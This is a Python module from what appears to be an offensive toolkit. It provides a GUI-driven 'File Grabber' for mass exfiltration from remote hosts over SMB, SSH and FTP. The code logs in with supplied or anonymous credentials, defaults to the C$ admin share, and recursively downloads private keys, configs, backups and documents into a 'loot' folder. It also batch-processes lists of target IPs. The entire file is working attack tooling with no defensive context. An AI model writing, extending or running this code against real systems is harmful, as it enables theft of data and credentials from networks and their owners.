# language: Python, file: modules/filegrab.py
# File Grabber — mass file exfiltration via SMB / SSH / FTP
import customtkinter as ctk
import threading
import os
import json
import subprocess
import paramiko
import shutil
import time
from datetime import datetime


class FileGrabber:
    """يجمع ملفات من أنظمة متعددة: SMB، SSH، FTP"""

    def __init__(self, log_queue=None, output_dir="loot/grab"):
        self.log = log_queue
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def _out(self, text):
        if self.log:
            self.log.put(f"[grab] {text}")

    # ==================== SMB ====================
    def grab_smb(self, ip, username, password, share="C$",
                 extensions=None, max_size_mb=100):
        """
        يسحب ملفات من SMB share.
        """
        extensions = extensions or ["pdf", "doc", "docx", "xls", "xlsx",
                                     "pem", "key", "txt", "conf", "bak"]
        local_dir = os.path.join(self.output_dir, f"smb_{ip.replace('.', '_')}")
        os.makedirs(local_dir, exist_ok=True)

        self._out(f"SMB grabbing from {ip}://{share}")

        # smbclient script
        commands = ["prompt OFF", "recurse ON",
                     f"lcd {local_dir}"]
        for ext in extensions:
            commands.append(f"mask *.{ext}")
            commands.append("mget *")

        cmd = ["smbclient", f"//{ip}/{share}",
               "-U", f"{username}%{password}",
               "-c", "; ".join(commands)]

        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=600)
            files = sum(len(files) for _, _, files in os.walk(local_dir))
            return {
                "ip": ip,
                "share": share,
                "files_downloaded": files,
                "local_dir": local_dir,
                "success": True,
            }
        except subprocess.TimeoutExpired:
            return {"ip": ip, "error": "timeout"}
        except Exception as e:
            return {"ip": ip, "error": str(e)}

    def list_smb_shares(self, ip, username="", password=""):
        """قائمة shares"""
        try:
            cmd = ["smbclient", "-L", f"//{ip}"]
            if username:
                cmd.extend(["-U", f"{username}%{password}"])
            else:
                cmd.extend(["-N"])

            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=30)
            shares = []
            for line in r.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 2 and parts[1] in ("Disk", "IPC"):
                    shares.append(parts[0])
            return shares
        except Exception:
            return []

    # ==================== SSH ====================
    def grab_ssh(self, ip, username, password,
                 remote_path="/home", extensions=None, max_files=200):
        """
        يسحب ملفات من SSH.
        """
        extensions = extensions or ["pdf", "doc", "pem", "key", "txt",
                                     "conf", "sql", "bak", "zip"]
        local_dir = os.path.join(self.output_dir, f"ssh_{ip.replace('.', '_')}")
        os.makedirs(local_dir, exist_ok=True)

        self._out(f"SSH grabbing from {ip}:{remote_path}")

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=password,
                           timeout=15)

            # build find command
            ext_pattern = " -o ".join(f"-name '*.{e}'" for e in extensions)
            find_cmd = f"find {remote_path} -type f \\( {ext_pattern} \\) 2>/dev/null | head -{max_files}"

            stdin, stdout, stderr = client.exec_command(find_cmd)
            files = stdout.read().decode().strip().splitlines()

            downloaded = 0
            sftp = client.open_sftp()
            for remote_file in files:
                try:
                    filename = os.path.basename(remote_file)
                    local_path = os.path.join(local_dir, filename)
                    sftp.get(remote_file, local_path)
                    downloaded += 1
                    self._out(f"  ✓ {filename}")
                except Exception as e:
                    self._out(f"  ✗ {remote_file}: {e}")

            sftp.close()
            client.close()

            return {
                "ip": ip,
                "files_found": len(files),
                "files_downloaded": downloaded,
                "local_dir": local_dir,
                "success": True,
            }
        except Exception as e:
            return {"ip": ip, "error": str(e)}

    # ==================== FTP ====================
    def grab_ftp(self, ip, username="anonymous", password="",
                 port=21, remote_path="/"):
        """يسحب من FTP"""
        from ftplib import FTP
        local_dir = os.path.join(self.output_dir, f"ftp_{ip.replace('.', '_')}")
        os.makedirs(local_dir, exist_ok=True)

        self._out(f"FTP grabbing from {ip}:{port}")

        try:
            ftp = FTP()
            ftp.connect(ip, port, timeout=15)
            ftp.login(username, password)

            downloaded = 0

            def _download(filename):
                nonlocal downloaded
                try:
                    local_path = os.path.join(local_dir, filename)
                    with open(local_path, "wb") as f:
                        ftp.retrbinary(f"RETR {filename}", f.write)
                    downloaded += 1
                except Exception:
                    pass

            try:
                ftp.cwd(remote_path)
                ftp.retrlines("LIST", lambda line: _download(line.split()[-1]))
            except Exception:
                # try recursive download via anonymous user
                for f in ftp.nlst():
                    try:
                        _download(f)
                    except Exception:
                        pass

            ftp.quit()
            return {
                "ip": ip,
                "files_downloaded": downloaded,
                "local_dir": local_dir,
                "success": True,
            }
        except Exception as e:
            return {"ip": ip, "error": str(e)}

    # ==================== Batch ====================
    def grab_multiple_smb(self, targets, extensions=None):
        """يسحب من قائمة أهداف"""
        results = []
        for ip, user, password in targets:
            self._out(f"\n=== {ip} ===")
            result = self.grab_smb(ip, user, password, extensions=extensions)
            results.append(result)
        return results


# ═══════════════════════════════════════════════════════════════════
# Module UI
# ═══════════════════════════════════════════════════════════════════
class FileGrabModule:
    def __init__(self, log_queue, app=None):
        self.log = log_queue
        self.name = "filegrab"
        self.app = app
        self.grabber = FileGrabber(log_queue)

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="FILE GRABBER",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="SMB · SSH · FTP · mass exfiltration",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # target config
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)
        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=6)

        ctk.CTkLabel(r1, text="IP:",
                     font=ctk.CTkFont(size=11),
                     text_color="#c8d6e5").pack(side="left", padx=(0, 4))
        self.ip_entry = ctk.CTkEntry(r1, placeholder_text="192.168.1.100",
                                       width=180, height=30,
                                       fg_color="#05080c",
                                       border_color="#1a2332")
        self.ip_entry.pack(side="left", padx=(0, 8))

        ctk.CTkLabel(r1, text="User:",
                     font=ctk.CTkFont(size=11),
                     text_color="#c8d6e5").pack(side="left", padx=(0, 4))
        self.user_entry = ctk.CTkEntry(r1, placeholder_text="admin",
                                        width=140, height=30,
                                        fg_color="#05080c",
                                        border_color="#1a2332")
        self.user_entry.pack(side="left", padx=(0, 8))

        ctk.CTkLabel(r1, text="Password:",
                     font=ctk.CTkFont(size=11),
                     text_color="#c8d6e5").pack(side="left", padx=(0, 4))
        self.pass_entry = ctk.CTkEntry(r1, placeholder_text="password",
                                        width=140, height=30, show="*",
                                        fg_color="#05080c",
                                        border_color="#1a2332")
        self.pass_entry.pack(side="left")

        r2 = ctk.CTkFrame(cfg, fg_color="transparent")
        r2.pack(fill="x", padx=12, pady=6)

        ctk.CTkLabel(r2, text="Share/Path:",
                     font=ctk.CTkFont(size=11),
                     text_color="#c8d6e5").pack(side="left", padx=(0, 4))
        self.share_entry = ctk.CTkEntry(r2, placeholder_text="C$ or /home",
                                         width=200, height=30,
                                         fg_color="#05080c",
                                         border_color="#1a2332")
        self.share_entry.pack(side="left", padx=(0, 8))

        ctk.CTkLabel(r2, text="Extensions:",
                     font=ctk.CTkFont(size=11),
                     text_color="#c8d6e5").pack(side="left", padx=(0, 4))
        self.ext_entry = ctk.CTkEntry(r2,
                                       placeholder_text="pdf,doc,key,pem",
                                       width=280, height=30,
                                       fg_color="#05080c",
                                       border_color="#1a2332")
        self.ext_entry.insert(0, "pdf,doc,docx,xls,xlsx,pem,key,txt,conf,bak")
        self.ext_entry.pack(side="left")

        # Actions
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", padx=24, pady=12)
        for label, fn in [
            ("🔍 List SMB shares", self._list_shares),
            ("⬇ Grab SMB", self._grab_smb),
            ("⬇ Grab SSH", self._grab_ssh),
            ("⬇ Grab FTP", self._grab_ftp),
            ("▸ Open loot dir", self._open_loot),
        ]:
            ctk.CTkButton(row, text=label, width=180, height=34,
                          fg_color="#141a22", hover_color="#1a2332",
                          font=ctk.CTkFont(size=11),
                          command=fn).pack(side="left", padx=(0, 4))

        # Output
        ctk.CTkLabel(parent, text="Output:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24,
                                                 anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=450
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

    def _out(self, text):
        self.out.insert("end", text + "\n")
        self.out.see("end")

    def _get_target(self):
        ip = self.ip_entry.get().strip()
        user = self.user_entry.get().strip() or "anonymous"
        password = self.pass_entry.get().strip()
        share = self.share_entry.get().strip()
        exts = [e.strip() for e in self.ext_entry.get().split(",")
                if e.strip()]
        return ip, user, password, share, exts

    def _list_shares(self):
        ip, user, password, _, _ = self._get_target()
        if not ip:
            self._out("[!] IP required")
            return

        def run():
            self._out(f"[*] listing shares on {ip}...")
            shares = self.grabber.list_smb_shares(ip, user, password)
            self._out(f"[+] {len(shares)} shares:")
            for s in shares:
                self._out(f"  • {s}")
        threading.Thread(target=run, daemon=True).start()

    def _grab_smb(self):
        ip, user, password, share, exts = self._get_target()
        if not ip:
            return
        share = share or "C$"

        def run():
            self._out(f"[*] grabbing from {ip}://{share}...")
            result = self.grabber.grab_smb(ip, user, password, share,
                                            extensions=exts)
            self._out(json.dumps(result, indent=2, default=str))
        threading.Thread(target=run, daemon=True).start()

    def _grab_ssh(self):
        ip, user, password, share, exts = self._get_target()
        if not ip:
            return
        share = share or "/home"

        def run():
            self._out(f"[*] grabbing via SSH from {ip}...")
            result = self.grabber.grab_ssh(ip, user, password, share,
                                            extensions=exts)
            self._out(json.dumps(result, indent=2, default=str))
        threading.Thread(target=run, daemon=True).start()

    def _grab_ftp(self):
        ip, user, password, share, _ = self._get_target()
        if not ip:
            return

        def run():
            self._out(f"[*] grabbing via FTP from {ip}...")
            result = self.grabber.grab_ftp(ip, user, password,
                                            remote_path=share or "/")
            self._out(json.dumps(result, indent=2, default=str))
        threading.Thread(target=run, daemon=True).start()

    def _open_loot(self):
        os.system(f"xdg-open {self.grabber.output_dir} &")
